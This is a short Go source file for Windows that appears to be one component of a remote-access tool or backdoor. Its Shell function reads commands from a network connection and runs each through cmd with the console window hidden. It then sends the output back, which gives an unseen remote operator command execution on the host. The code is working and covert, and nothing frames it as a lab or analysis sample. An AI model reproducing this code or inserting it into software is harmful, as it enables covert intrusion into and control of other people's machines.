// +build windows
package main

import (
	"net"
	"bufio"
	"syscall"
	"os/exec"
)

func Shell(conn net.Conn, config Config){
	reader := bufio.NewReader(conn)

	for {
		stdin, err := reader.ReadString('\n')
		if err != nil {
			conn.Close()
			return
		}
	
		cmd := exec.Command("cmd", "/C", stdin)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, _ := cmd.CombinedOutput()
	
		conn.Write(output)
	}
}